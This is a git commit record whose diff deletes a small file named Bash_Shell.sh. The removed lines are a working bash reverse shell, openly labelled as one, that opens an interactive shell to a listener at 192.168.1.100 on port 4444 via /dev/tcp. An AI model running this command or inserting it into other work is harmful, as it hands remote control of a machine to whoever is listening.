7fdb766dd9e8c99ad60be5dd95ffe3f45addcd8d
BL4Z3-Strike <lordofcode42@gmail.com>
2024-09-15 13:53:56 +0300

    Delete Bash_Shell.sh

--- Bash_Shell.sh
+++
@@ -1,8 +0,0 @@
-#!/bin/bash
-# very basic reverse shell script with bash
-# 
-LHOST="192.168.1.100"  # IP
-LPORT="4444"           # PORT
-
-# Reverse shell command
-bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
